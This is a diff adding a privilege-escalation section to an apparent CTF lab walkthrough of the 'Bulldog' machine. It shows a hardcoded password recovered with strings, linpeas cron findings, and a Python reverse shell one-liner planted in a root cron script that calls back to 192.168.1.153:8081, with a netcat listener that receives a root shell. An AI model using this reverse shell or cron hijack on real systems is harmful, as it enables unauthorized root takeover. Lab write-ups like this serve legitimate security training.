@@ -311,8 +311,89 @@ bulldog
 db.sqlite3
 manage.py
 ```
+-> upgrade to tty
 
 
 
 # Privilege Escaltion
+First way:
+Found Hidden directory `/home/bulldogadmin/.hiddenadmindirectory
+```shell
+$ ls
+customPermissionApp  note
+$ cat note
+Nick,
+
+I'm working on the backend permission stuff. Listen, it's super prototype but I think it's going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! 
+
+It's great stuff! Once I'm finished with it, a hacker wouldn't even be able to reverse it! Keep in mind that it's still a prototype right now. I am about to get it working with the Django user account. I'm not sure how I'll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?
+
+Let me know what you think of it!
+
+-Ashley
+```
+
+```shell
+strings customPermissionApp                 
+/lib64/ld-linux-x86-64.so.2
+32S0-t
+libc.so.6
+puts
+__stack_chk_fail
+system
+__libc_start_main
+__gmon_start__
+GLIBC_2.4
+GLIBC_2.2.5
+UH-H
+SUPERultH
+imatePASH
+SWORDyouH
+CANTget
+dH34%(
+AWAVA
+AUATL
+[]A\A]A^A_
+Please enter a valid username to use root privileges
+	Usage: ./customPermissionApp <username>
+sudo su root
+
+```
+
+second way :
+Linpeas
+```shell
+╔══════════╣ Cron jobs
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cro
+n-jobs
+/usr/bin/crontab
+incrontab Not Found
+-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab
+
+/etc/cron.d:
+total 24
+drwxr-xr-x  2 root root 4096 Aug 26  2017 .
+drwxr-xr-x 94 root root 4096 May 12 09:57 ..
+-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+-rw-r--r--  1 root root  191 Aug 24  2017 popularity-contest
+-rw-r--r--  1 root root   54 Aug 26  2017 runAV
+```
+Edit Application by a reverse shell which is executed every minute
+```shell
+django@bulldog:/.hiddenAVDirectory$ cat AVApplication.py 
+#!/usr/bin/env python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.153",8081));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+# Just wanted to throw this placeholder here really quick.
+# We will put the full AV here when the vendor is done making it.
+# - Alan
+```
+```shell
+nc -lnvp 8081                       
+listening on [any] 8081 ...
+connect to [192.168.1.153] from (UNKNOWN) [192.168.1.155] 42074
+# whoami
+whoami
+root
+```
 
